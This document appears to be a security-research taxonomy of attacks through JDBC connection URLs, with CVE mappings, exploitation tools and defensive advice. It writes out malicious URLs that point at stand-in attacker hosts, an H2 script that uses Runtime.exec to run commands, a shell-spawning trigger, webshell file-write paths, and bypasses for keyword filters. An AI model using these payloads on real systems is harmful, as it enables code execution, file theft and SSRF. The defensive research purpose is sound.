# JDBC Attack Mutation/Variation Taxonomy

---

## Classification Structure

JDBC (Java Database Connectivity) attacks exploit the trust boundary between application code and database driver initialization. Unlike traditional SQL injection that targets query execution, JDBC attacks target the **connection establishment phase** — the moment when a driver interprets a connection URL, instantiates classes, negotiates protocols, or processes server responses. The attack surface spans multiple database drivers (MySQL, PostgreSQL, H2, Derby, DB2, SQLite, MSSQL, Oracle), each with unique properties, protocol features, and class-loading behaviors.

This taxonomy organizes JDBC attack mutations along three axes:

- **Axis 1 (Mutation Target)**: The structural component of the JDBC connection or driver being exploited — connection URL parameters, protocol-level features, class instantiation, script execution engines, or server-initiated operations.
- **Axis 2 (Root Cause)**: The underlying reason why the attack succeeds — unsafe deserialization, unvalidated class loading, JNDI lookup with attacker input, protocol-level data exfiltration, parser differentials, or script execution by design.
- **Axis 3 (Impact Scenario)**: The weaponized outcome — Remote Code Execution (RCE), Arbitrary File Read (AFR), Server-Side Request Forgery (SSRF), SQL Injection, or Denial of Service (DoS).

### Axis 2: Cross-Cutting Root Cause Types

| Root Cause | Description | Primary Drivers |
|---|---|---|
| **Unsafe Deserialization** | Driver deserializes server-provided or URL-triggered objects without validation | MySQL, Derby |
| **Unvalidated Class Instantiation** | Driver loads and instantiates classes named in connection properties | PostgreSQL, H2 |
| **JNDI Injection** | Driver performs JNDI lookups using attacker-controlled names | DB2, Informix, H2 |
| **Script/Code Execution by Design** | Driver supports inline SQL/JS script execution via URL parameters | H2, SQLite |
| **Protocol-Level Data Exfiltration** | Server-initiated protocol commands read client-side files | MySQL |
| **Parser Differential** | Parameterized query parser mishandles edge cases, enabling injection | PostgreSQL |
| **Unchecked Logger/Trace Injection** | Trace file paths or log properties lead to arbitrary file write | DB2 |

---

## §1. Deserialization via Fake Server (MySQL)

MySQL JDBC attacks exploit the MySQL Connector/J driver's deserialization capabilities when connecting to an attacker-controlled MySQL server. The client-side driver deserializes server-provided data, enabling arbitrary code execution through Java gadget chains.

### §1-1. ServerStatusDiffInterceptor Deserialization

When `autoDeserialize=true` and `queryInterceptors` is set to `com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`, the MySQL JDBC driver calls `getObject()` on server-provided result sets. A fake MySQL server returns malicious serialized Java objects, which the driver deserializes via `readObject()`.

| Subtype | Mechanism | Key Condition | Affected Versions |
|---|---|---|---|
| **ServerStatusDiffInterceptor (Connector/J 8.x)** | `queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor` triggers `getObject()` on `SHOW SESSION STATUS` results | `autoDeserialize=true` | mysql-connector-java < 8.0.20 |
| **ServerStatusDiffInterceptor (Connector/J 5.x)** | `statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor` (legacy package path) | `autoDeserialize=true` | mysql-connector-java 5.x |

**Example JDBC URL:**
```
jdbc:mysql://evil-server:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

### §1-2. detectCustomCollations Deserialization

In older MySQL Connector/J versions, when `detectCustomCollations=true`, the driver queries `SHOW COLLATION` and deserializes custom collation metadata returned by the server.

| Subtype | Mechanism | Key Condition | Affected Versions |
|---|---|---|---|
| **Custom Collation Deserialization** | `detectCustomCollations=true` triggers deserialization of `SHOW COLLATION` results | `autoDeserialize=true` | mysql-connector-java 5.1.19–5.1.28 |
| **Extended Collation Index** | Fake server returns collation index > 2047, triggering a different code path with `getObject()` | `autoDeserialize=true` | mysql-connector-java 5.1.29–5.1.48 |

### §1-3. Gadget Chain Integration

The deserialization attack requires a compatible gadget chain in the target application's classpath. Common chains used with MySQL JDBC deserialization include:

| Gadget Chain | Library Dependency | Capability |
|---|---|---|
| **CommonsCollections** | Apache Commons Collections 3.x/4.x | Arbitrary command execution |
| **CommonsBeansutils** | Apache Commons BeanUtils | Arbitrary command execution |
| **C3P0** | C3P0 connection pool | JNDI lookup / remote class loading |
| **Fastjson** | Alibaba Fastjson | Arbitrary command execution |
| **URLDNS** | JDK built-in | DNS lookup (detection/verification) |

---

## §2. Arbitrary Class Instantiation via Driver Properties (PostgreSQL)

PostgreSQL JDBC driver (pgjdbc) accepts class names through connection properties and instantiates them without verifying interface conformance. An attacker who controls the JDBC URL can load arbitrary classes from the application's classpath.

### §2-1. Socket and SSL Factory Injection

The driver supports pluggable socket and SSL factory classes specified via URL properties. Prior to patching, these classes were instantiated without interface checks.

| Subtype | Property | Constructor Arg Property | Exploitable With |
|---|---|---|---|
| **socketFactory** | `socketFactory={class}` | `socketFactoryArg={arg}` | Spring `ClassPathXmlApplicationContext` |
| **sslfactory** | `sslfactory={class}` | `sslfactoryarg={arg}` | Any single-string-arg constructor class |
| **sslhostnameverifier** | `sslhostnameverifier={class}` | N/A | Classes with no-arg or single-arg constructors |

**Example JDBC URL:**
```
jdbc:postgresql://target/db?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://evil/exp.xml
```

### §2-2. Authentication Plugin Injection

The `authenticationPluginClassName` property allows specifying a custom authentication handler class. Without validation, any class on the classpath with a matching constructor can be instantiated.

| Subtype | Property | Key Condition |
|---|---|---|
| **authenticationPluginClassName** | `authenticationPluginClassName={class}` | Class must exist on target classpath |
| **sslpasswordcallback** | `sslpasswordcallback={class}` | Class must have compatible constructor |

### §2-3. loggerLevel / loggerFile (Older Versions)

In very old pgjdbc versions, `loggerLevel` and `loggerFile` properties allow writing arbitrary log content to arbitrary file paths, potentially enabling webshell deployment.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Log File Write** | `loggerLevel=DEBUG&loggerFile=/path/to/webshell.jsp` | Writable path, old pgjdbc versions |

**Patch**: CVE-2022-21724 was fixed in pgjdbc 42.2.25 / 42.3.2 by adding interface verification before instantiation.

---

## §3. Script and Code Execution via URL Parameters (H2 Database)

H2 database supports powerful initialization parameters in the JDBC URL that can execute SQL scripts, create Java-based triggers, and load remote resources — all during connection establishment.

### §3-1. INIT RUNSCRIPT — Remote Script Loading

The `INIT=RUNSCRIPT FROM` parameter instructs H2 to fetch and execute an SQL script from a URL at connection time.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Remote HTTP RUNSCRIPT** | `INIT=RUNSCRIPT FROM 'http://evil/poc.sql'` | Network access from target server |
| **Local File RUNSCRIPT** | `INIT=RUNSCRIPT FROM '/etc/passwd'` (information disclosure via error) | File read access |
| **Multi-Statement INIT** | `INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd)...'\\;CALL EXEC('cmd')` | Inline Java code in CREATE ALIAS |

**Example JDBC URL:**
```
jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil/poc.sql'
```

**Example poc.sql:**
```sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('calc');
```

### §3-2. CREATE ALIAS with Java Code

H2 allows `CREATE ALIAS` with inline Java source code. Combined with INIT or the H2 console, this provides direct code execution.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Inline Java ALIAS** | `CREATE ALIAS ... AS $$ static String exec(String cmd) { Runtime.exec(cmd); } $$` | H2 connection with DDL permission |
| **JavaScript Trigger** | `CREATE TRIGGER t BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','cmd']).start()$$` | Nashorn JS engine available (JDK < 15) |
| **Groovy Trigger** | Trigger body using Groovy scripting engine | Groovy on classpath |

### §3-3. JNDI-Based Exploitation via H2 Console

The H2 Console's JDBC URL field accepts `javax.naming.InitialContext` lookups, enabling JNDI injection.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **LDAP JNDI** | Connection URL triggers `javax.naming.InitialContext.lookup()` with LDAP URL | H2 Console exposed, JDK with JNDI remote loading |
| **RMI JNDI** | Same mechanism via RMI URL | Older JDK versions (< 8u191) |

### §3-4. Case Sensitivity and Keyword Filter Bypass

When applications attempt to blacklist dangerous keywords like `INIT`, `RUNSCRIPT`, or `SHUTDOWN`, H2's case-insensitive SQL parser enables trivial bypasses.

| Subtype | Mechanism | Example |
|---|---|---|
| **Mixed Case Bypass** | H2 SQL parser is case-insensitive | `RUnSCRIPT`, `iNiT`, `ShUtDoWn` |
| **Whitespace Injection** | Extra spaces between parameters bypass regex filters | `INIT = RUNSCRIPT  FROM` |
| **Unicode/Encoding Bypass** | URL encoding or Unicode normalization evades keyword detection | `%49%4E%49%54` for `INIT` |
| **Comment Injection** | SQL comments between keywords | `INIT=/**/RUNSCRIPT/**/FROM` |
| **Semicolon Chaining** | Multiple INIT statements separated by `\;` | `INIT=S1\;S2\;S3` |

**Patch**: CVE-2022-23221 fixed in H2 2.1.210. Additional bypass CVE-2025-32966 addressed case sensitivity issues.

---

## §4. Protocol-Level File Read (MySQL LOAD DATA LOCAL)

MySQL's protocol includes a server-initiated `LOAD DATA LOCAL INFILE` mechanism. A malicious MySQL server can instruct the client to read and transmit any local file accessible to the Java process.

### §4-1. Classic LOAD DATA LOCAL INFILE

When `allowLoadLocalInfile=true`, the MySQL server sends a `LOCAL INFILE Request` packet, and the client reads the specified file and transmits its contents.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Fake Server File Read** | Malicious server sends `LOCAL INFILE` request for `/etc/passwd`, client credentials, etc. | `allowLoadLocalInfile=true` (default in Connector/J ≤ 8.0.14) |
| **URL-Based File Read** | `allowUrlInLocalInfile=true` allows reading from URLs instead of local files | `allowUrlInLocalInfile=true` |
| **Path-Restricted Bypass** | `allowLoadLocalInfileInPath=/safe/dir` can be bypassed via path traversal (`../`) | Misconfigured path restriction |

### §4-2. Combined with Connection Parameter Injection

When an application constructs JDBC URLs from user input but only validates the host/port, an attacker can inject additional parameters using `&` or `?` characters.

| Subtype | Mechanism | Example |
|---|---|---|
| **Host Field Injection** | Inject `&allowLoadLocalInfile=true` in the host field | `evil-server:3306/db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true` |
| **Database Name Injection** | Inject parameters via the database name field | `testdb?autoDeserialize=true&queryInterceptors=...` |

### §4-3. Version-Specific Default Behaviors

| MySQL Connector/J Version | `allowLoadLocalInfile` Default | `autoDeserialize` Default |
|---|---|---|
| ≤ 5.1.x | `true` | `false` |
| 8.0.1–8.0.14 | `true` | `false` |
| ≥ 8.0.15 | `false` | `false` |
| ≥ 8.0.20 | `false` (+ interceptor restrictions) | `false` |

---

## §5. JNDI Injection via Driver Properties (DB2, Informix, H2)

Several JDBC drivers perform JNDI lookups using connection property values. If an attacker controls these values, they can redirect lookups to malicious LDAP/RMI servers for remote class loading and code execution.

### §5-1. IBM DB2 JNDI Injection

| Subtype | Property | CVE | CVSS |
|---|---|---|---|
| **clientRerouteServerListJNDIName** | `clientRerouteServerListJNDIName=ldap://evil/obj` | CVE-2023-27867 | 6.3 |
| **traceFile Arbitrary Write** | `traceFile=/path/to/webshell` | CVE-2023-27869 | 6.3 |
| **Additional JNDI Property** | Secondary JNDI-injectable property | CVE-2023-27868 | 6.3 |

**Example JDBC URL:**
```
jdbc:db2://target:50000/SAMPLE:clientRerouteServerListJNDIName=ldap://evil/Exploit;
```

### §5-2. IBM Informix JNDI Injection

The IBM Informix JDBC driver performs JNDI lookups when certain connection string properties reference LDAP URLs, without validating the URL source.

| Subtype | Mechanism | CVE |
|---|---|---|
| **Connect String LDAP Injection** | LDAP URL in connection string triggers `InitialContext.lookup()` | CVE-2023-27866 |

### §5-3. Databricks JDBC JNDI/Kerberos Injection

| Subtype | Mechanism | CVE |
|---|---|---|
| **krbJAASFile Injection** | `krbJAASFile` property references attacker-controlled JAAS config | CVE-2024-49194 |

---

## §6. Replication Protocol Deserialization (Apache Derby)

Apache Derby's replication feature establishes socket connections to slave servers and deserializes the incoming data stream without validation.

### §6-1. Slave Replication Deserialization

When `startMaster=true` and `slaveHost` points to a malicious server, Derby connects and automatically deserializes the response stream.

| Subtype | Mechanism | Key Properties |
|---|---|---|
| **Master-Slave Deserialization** | `startMaster=true;slaveHost=evil-server;slavePort=4851` triggers `SocketConnection` which deserializes slave response | Class: `org.apache.derby.impl.store.replication.net.SocketConnection` |

**Example JDBC URL:**
```
jdbc:derby:db;startMaster=true;slaveHost=evil-server;slavePort=4851
```

The deserialization occurs in the replication protocol handler. A malicious slave server responds with crafted serialized objects, which Derby deserializes using standard Java `ObjectInputStream`, chaining into any available gadget.

---

## §7. Native Library Loading and Resource Injection (SQLite)

SQLite JDBC (via `org.sqlite.JDBC`) supports resource loading and native extension features that can be weaponized for code execution.

### §7-1. Resource URL Loading

When the JDBC URL starts with `:resource:`, the SQLite driver calls `extractResource()` to obtain database content from a URL connection.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Remote Resource Loading** | `jdbc:sqlite::resource:http://evil/malicious.db` loads a DB from remote URL | Network access from target |
| **UNC Path Loading (Windows)** | `jdbc:sqlite::resource:\\evil\share\malicious.db` loads from SMB share | Windows environment |

### §7-2. Native Extension Loading via CREATE VIEW

After loading a malicious database via `:resource:`, attackers use `CREATE VIEW` to convert uncontrollable SELECT statements into `SELECT load_extension('/tmp/evil.so')`, loading arbitrary shared libraries.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **load_extension via VIEW** | Malicious DB contains view with `load_extension()` call | `enable_load_extension=true` or compiled-in support |
| **Staged Attack** | Step 1: Download `.so`/`.dll` via resource URL; Step 2: Load via `load_extension()` | Write access to tmp + extension loading enabled |

---

## §8. SQL Injection via Driver Parsing Flaws (PostgreSQL)

Unlike application-level SQL injection, this category targets flaws in the JDBC driver's own parameterized query implementation, breaking the security guarantees that prepared statements are supposed to provide.

### §8-1. PreferQueryMode=SIMPLE Injection (CVE-2024-1597)

When `preferQueryMode=simple` is set, the PostgreSQL JDBC driver processes queries differently. A specific pattern — a negated numeric parameter followed by a string parameter on the same line — allows SQL injection through parameter values.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Negated Parameter Injection** | Payload: `-$1` followed by `$2` (string) on the same line; attacker crafts string value to break out of parameterization | `preferQueryMode=simple` (non-default) |

**Vulnerable SQL Pattern:**
```sql
SELECT * FROM table WHERE value = -$1 AND name = $2
```

**Attack**: The string parameter `$2` is crafted to inject SQL, bypassing the parameterized query protection. CVSS: **10.0 (Critical)**.

### §8-2. Amazon Redshift JDBC Metadata API Injection

SQL injection exists in the Redshift JDBC driver's metadata retrieval methods.

| Subtype | Mechanism | CVE |
|---|---|---|
| **getSchemas Injection** | `getSchemas()` method constructs SQL unsafely | CVE-2024-12744 |
| **getTables Injection** | `getTables()` method vulnerable to injection | CVE-2024-12744 |
| **getColumns Injection** | `getColumns()` method vulnerable to injection | CVE-2024-12744 |

---

## §9. SSRF and Network Interaction via JDBC Connections

JDBC connections inherently involve network activity. When an attacker controls the connection target, this becomes an SSRF primitive.

### §9-1. Direct Connection SSRF

The most basic SSRF — forcing the application server to initiate TCP connections to arbitrary hosts/ports.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Internal Port Scanning** | `jdbc:mysql://internal-host:{port}/db` — connection success/failure reveals port state | Attacker controls JDBC host/port |
| **Cloud Metadata Probing** | `jdbc:postgresql://169.254.169.254/...` — TCP connection to metadata service | Cloud environment, unfiltered JDBC host |
| **DNS Exfiltration** | `jdbc:mysql://{data}.evil.com/db` — DNS resolution leaks data | DNS access from target |

### §9-2. Driver-Specific Network Features

| Subtype | Driver | Mechanism |
|---|---|---|
| **MySQL Fabric XMLRPC** | MySQL | MySQL Fabric protocol makes XMLRPC calls to attacker-controlled endpoint |
| **SQLite Resource URL** | SQLite | `:resource:http://internal/...` fetches from arbitrary URL |
| **H2 RUNSCRIPT FROM URL** | H2 | `INIT=RUNSCRIPT FROM 'http://internal/...'` fetches from arbitrary URL |
| **Derby Slave Connection** | Derby | `slaveHost=internal-host` initiates TCP connection |

---

## §10. Connection String Parameter Pollution

When applications construct JDBC URLs from user input, attackers can inject additional parameters to enable dangerous driver features.

### §10-1. Parameter Injection Vectors

| Subtype | Mechanism | Example |
|---|---|---|
| **Ampersand Injection** | `&` in host/database field appends parameters | `evil-host&autoDeserialize=true` |
| **Question Mark Injection** | `?` in database name starts parameter section | `testdb?allowLoadLocalInfile=true` |
| **Semicolon Injection** | `;` in some drivers separates properties | `db;INIT=RUNSCRIPT FROM 'http://evil/x.sql'` |
| **Double URL Encoding** | `%26` → `&` after one decode layer | Bypasses single-layer URL decode filters |

### §10-2. Filter Bypass Techniques

| Subtype | Mechanism | Target |
|---|---|---|
| **Keyword Blacklist Bypass** | Case variation, Unicode, encoding | `autoDeserialize` → `AutoDeserialize` |
| **Regex Bypass** | Whitespace injection, comment insertion | `INIT = RUNSCRIPT` with extra spaces |
| **Property Override** | Later duplicate parameter overrides earlier | `?autoDeserialize=false&autoDeserialize=true` |
| **URL Fragment/Userinfo** | Inject via `@` (userinfo) or `#` (fragment) in URL | `jdbc:mysql://user:pass@evil-host/db` |
| **IPv6 Bracket Abuse** | Use `[::1]` or IPv6 brackets to bypass host validation | `jdbc:postgresql://[::1]/db` |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories |
|---|---|---|
| **Remote Code Execution** | Deserialization gadget on classpath, or script engine available | §1 + §2 + §3 + §5 + §6 + §7 |
| **Arbitrary File Read** | MySQL fake server, or H2/SQLite resource loading | §4 + §7 + §9 |
| **Server-Side Request Forgery** | Application server in cloud/internal network | §9 + §3-1 + §7-1 |
| **SQL Injection** | Driver parsing flaw, non-default configuration | §8 |
| **Credential Theft / NTLM Relay** | Windows environment with MSSQL | §9-1 (MSSQL `xp_dirtree`/`xp_fileexist`) |
| **Denial of Service** | Connection to malicious server causing resource exhaustion | §1 (infinite deserialization), §6 (Derby hang) |
| **Webshell Deployment** | Write access to web-accessible directory | §2-3 (loggerFile), §5-1 (traceFile) |

---

## CVE / Bounty Mapping (2022–2025)

| Mutation Combination | CVE / Case | Impact |
|---|---|---|
| §8-1 (PreferQueryMode=SIMPLE SQLi) | CVE-2024-1597 (PostgreSQL JDBC) | CVSS 10.0. Full SQL injection bypassing parameterized queries |
| §8-2 (Redshift Metadata API SQLi) | CVE-2024-12744 (Amazon Redshift JDBC) | Privilege escalation via metadata API injection |
| §2-1 + §2-2 (Class Instantiation) | CVE-2022-21724 (PostgreSQL JDBC) | CVSS 8.5. RCE via socketFactory/sslfactory/authPlugin class loading |
| §3-1 (H2 INIT RUNSCRIPT) | CVE-2022-23221 (H2 Database) | RCE via JDBC URL INIT parameter |
| §3-4 (H2 Case Sensitivity Bypass) | CVE-2025-32966 (H2 Database) | Bypass of CVE-2022-23221 patch via case variation |
| §5-1 (DB2 JNDI clientReroute) | CVE-2023-27867 (IBM DB2 JDBC) | CVSS 6.3. RCE via JNDI injection |
| §5-1 (DB2 traceFile Write) | CVE-2023-27869 (IBM DB2 JDBC) | CVSS 6.3. Arbitrary file write via logger injection |
| §5-1 (DB2 Additional JNDI) | CVE-2023-27868 (IBM DB2 JDBC) | CVSS 6.3. RCE via JNDI injection |
| §5-2 (Informix JNDI) | CVE-2023-27866 (IBM Informix JDBC) | RCE via LDAP URL in connection string |
| §5-3 (Databricks krbJAASFile) | CVE-2024-49194 (Databricks JDBC) | RCE via Kerberos JAAS config injection |
| §1-1 + §1-3 (MySQL Deser + Gadget) | CVE-2024-23833 (OpenRefine) | RCE via MySQL JDBC URL attack in project import |
| §4-1 (MySQL File Read) | GHSA-qqh2 (OpenRefine) | Arbitrary file read via MySQL fake server |
| §1 + §10 (MySQL Deser + Param Inject) | GHSA-q4qq (DataEase) | RCE via unverified MySQL JDBC connection params |
| §3-1 (H2 INIT bypass) | GHSA-999m (DataEase) | RCE via H2 JDBC INIT/RUNSCRIPT bypass |
| §1 + §4 (MySQL Deser + File Read) | CVE-2025-6507 (H2O-3) | RCE via JDBC deserialization with parameter space bypass |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **JDBC-Attack** (su18) | MySQL, H2, Derby, DB2, SQLite, ModeShape | Comprehensive JDBC connection URL exploitation framework |
| **MySQL_Fake_Server** (fnmsd) | MySQL Connector/J deserialization + file read | Fake MySQL server returning serialized payloads or LOAD LOCAL INFILE |
| **fmysql** (trganda) | MySQL fake server deserialization | Lightweight fake MySQL server for JDBC exploitation |
| **ysoserial** (frohoff) | Java deserialization gadget chains | Generates serialized payloads for all major gadget chains |
| **ysoserial-modified** | Extended gadget chains | Additional chains (Fastjson, C3P0, etc.) for JDBC scenarios |
| **GadgetProbe** (BishopFox) | Remote classpath enumeration | Probes deserialization endpoints to identify available gadget libraries |
| **Java Deserialization Scanner** (Burp) | Deserialization endpoint detection | Burp Suite extension for identifying deserialization sinks |
| **MSSQLRelay** (CompassSecurity) | MSSQL NTLM relay audit | Checks MSSQL encryption settings and performs NTLM relay |
| **CodeQL JDBC Sink Rules** (GitHub) | Static analysis for JDBC SSRF sinks | Identifies user-controlled JDBC connection strings in source code |

---

## Summary: Core Principles

### The Fundamental Property

JDBC attacks exist because **the JDBC connection URL is not merely an address — it is a configuration language**. Database drivers interpret dozens of properties embedded in the URL that control class loading, script execution, protocol behavior, file I/O, and network operations. This design reflects an era when the connection string was considered trusted infrastructure configuration, not an attack surface. The moment any user-controlled input flows into a JDBC URL — even partially — the entire driver feature set becomes weaponizable.

### Why Incremental Fixes Fail

Each JDBC driver independently implements its own URL parsing, property handling, and feature set. Patching one attack vector (e.g., H2's `RUNSCRIPT`) does not address the underlying pattern — the same driver may still support `CREATE ALIAS` with inline Java, JNDI lookups, or trigger-based script execution. Blacklist-based defenses (filtering `INIT`, `autoDeserialize`, etc.) are structurally fragile: case sensitivity bypasses, encoding tricks, whitespace injection, and new property discoveries continuously erode them. The cross-driver nature of the problem means that securing MySQL connections does not protect against H2 or PostgreSQL attack vectors in the same application.

### Structural Solution

The structural defense requires **treating JDBC URLs as security-critical inputs** with:
1. **Allowlist-based property filtering** — only explicitly permitted properties should pass through, not blacklist-based keyword blocking.
2. **Driver-level hardening** — drivers should require explicit opt-in for dangerous features (file I/O, class loading, script execution, JNDI), defaulting to minimal-privilege connections.
3. **Connection URL construction isolation** — user input should never be concatenated into JDBC URLs; instead, use `DataSource` or connection pool configurations with fixed, pre-validated URLs.
4. **Classpath minimization** — remove unnecessary gadget libraries and scripting engines from application classpaths to limit exploitation even when a deserialization sink is reached.

---

## Reference

- [su18 — JDBC Connection URL Attack](https://su18.org/post/jdbc-connection-url-attack/)
- [su18 — JDBC-Attack GitHub Repository](https://github.com/su18/JDBC-Attack)
- [JFrog — The JNDI Strikes Back: RCE in H2 Database Console](https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/)
- [pyn3rd — Make JDBC Attacks Great Again](https://blog.pyn3rd.com/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/)
- [fnmsd — MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)
- [CVE-2024-1597 — PostgreSQL JDBC Driver SQL Injection](https://www.postgresql.org/about/news/postgresql-jdbc-4272-4261-4255-4244-4239-42228-and-42228jre7-security-update-for-cve-2024-1597-2812/)
- [CVE-2022-21724 — pgjdbc Unchecked Class Instantiation](https://github.com/advisories/GHSA-v7wg-cpwc-24m4)
- [CVE-2022-23221 — H2 Database RCE via JDBC URL](https://seclists.org/fulldisclosure/2022/Jan/39)
- [IBM Security Bulletin — DB2 JDBC RCE (CVE-2023-27867/27868/27869)](https://www.ibm.com/support/pages/security-bulletin-ibm%C2%AE-db2%C2%AE-jdbc-driver-vulnerable-remote-code-execution-cve-2023-27869-cve-2023-27867-cve-2023-27868)
- [CVE-2024-49194 — Databricks JDBC JNDI Injection](https://thecyberthrone.in/2024/12/21/detailing-databricks-vulnerability-cve-2024-49194/)
- [CVE-2024-12744 — Amazon Redshift JDBC SQL Injection](https://test.osv.dev/vulnerability/CVE-2024-12744)
- [CVE-2025-32966 — H2 Database INIT Case Sensitivity Bypass](https://github.com/dataease/dataease/security/advisories/GHSA-999m-jv2p-5h34)
- [Knownsec 404 — MySQL Client Arbitrary File Reading Attack Chain Extension](https://medium.com/@knownsec404team/mysql-client-arbitrary-file-reading-attack-chain-extension-727bb63f578c)
- [Markuta — Exploiting JDBC Deserialization in MFT Server by JSCAPE](https://markuta.com/jscape-mft-server-rce/)
- [frohoff — ysoserial](https://github.com/frohoff/ysoserial)

---

*This document was created for defensive security research and vulnerability understanding purposes.*
